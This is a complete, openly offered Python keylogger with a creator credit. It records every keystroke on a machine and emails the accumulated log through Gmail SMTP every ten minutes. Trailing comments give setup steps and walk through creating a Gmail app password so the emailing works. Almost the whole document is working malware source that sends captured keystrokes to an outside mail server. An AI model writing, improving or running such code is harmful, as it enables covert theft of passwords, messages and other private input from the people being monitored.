import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 600  # in seconds
EMAIL_ADDRESS = "@gmail.com"
EMAIL_PASSWORD = "email_password"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def send_email(self, email, password, message):
        try:
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            
            msg = MIMEText(message)
            msg['Subject'] = f"Keylogger Report - {self.start_dt}"
            msg['From'] = email
            msg['To'] = email
            
            server.sendmail(email, email, msg.as_string())
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

#CREATED BY EARL JOKHA
       #required to install
          #pip install keyboard
           #pip install smtplib
              # to launch
               # python keylogger.py
               #(How to Fix the Email Error (535 Bad Credentials)
                    #✅ Method 1: Use an App Password (Recommended)
                    #Enable 2-Step Verification (Required for App Passwords):

                    #Go to: https://myaccount.google.com/security

                    #Under "Signing in to Google", enable 2-Step Verification.

                    #Generate an App Password:

                    #Go to: https://myaccount.google.com/apppasswords

                    #Select "Mail" → "Other (Custom Name)" → Name it Python Keylogger.

                    #Click Generate → Copy the 16-digit password.

#SEND_REPORT_EVERY = 600  # in seconds( u can change use your own time )
#EMAIL_ADDRESS = "@gmail.com"
#EMAIL_PASSWORD = "email_password"  replace EMAIL WITH YOUR EMAIL AND PASSWORD WITH YOUR PASSWORD EMAIL as explain above to obtain password for your keyloger for much safety DO NOT USE YOUR PASSWORD FOR EMAIL JUST CREATE APP PASSWORD as explain 
